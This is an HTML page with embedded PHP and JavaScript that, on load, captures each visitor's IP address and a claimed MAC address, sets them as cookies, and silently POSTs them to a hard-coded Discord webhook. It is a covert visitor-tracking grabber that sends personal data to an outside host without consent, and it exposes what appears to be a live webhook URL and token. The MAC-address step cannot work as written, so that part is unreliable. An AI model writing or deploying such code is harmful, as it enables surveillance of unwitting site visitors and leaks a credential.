<!DOCTYPE html>
<html>
  <head>
    <title>Log User IP and MAC Address</title>
  </head>
  <body>
    <script>
      // Get the user's IP address
      const ipAddress =
        "<?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) echo $_SERVER['HTTP_X_FORWARDED_FOR']; else echo $_SERVER['REMOTE_ADDR']; ?>";

      // Set the IP address cookie
      document.cookie = `ip_address=${ipAddress}; path=/`;

      // Get the user's MAC address
      function getMacAddress(callback) {
        const xhr = new XMLHttpRequest();

        xhr.onreadystatechange = function () {
          if (xhr.readyState === XMLHttpRequest.DONE) {
            if (xhr.status === 200) {
              macAddress = xhr.responseText.trim();

              // Set the MAC address cookie
              document.cookie = `mac_address=${macAddress}; path=/`;

              // Log the IP and MAC addresses
              console.log(`IP Address: ${ipAddress}`);
              console.log(`MAC Address: ${macAddress}`);

              // Send the IP and MAC addresses to the Discord webhook
              sendToDiscordWebhook(ipAddress, macAddress);

              callback(null, macAddress);
            } else {
              console.error(`Error getting MAC address: ${xhr.statusText}`);
              callback(xhr.statusText, null);
            }
          }
        };

        xhr.open("GET", "get-mac-address.php?ip=" + ipAddress, true);
        xhr.send();
      }

      // Function to send the IP and MAC addresses to the Discord webhook
      function sendToDiscordWebhook(ipAddress, macAddress) {
        // Replace with your own Discord webhook URL
        const webhookUrl = "https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-";

        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            ip_address: ipAddress,
            mac_address: macAddress,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent to Discord webhook");
          })
          .catch((error) => {
            console.error(error);
          });
      }

      // Call the `getMacAddress` function with a callback
      getMacAddress((error, macAddress) => {
        if (error) {
          macAddress = "Unknown";
        }
      });
    </script>
  </body>
</html>
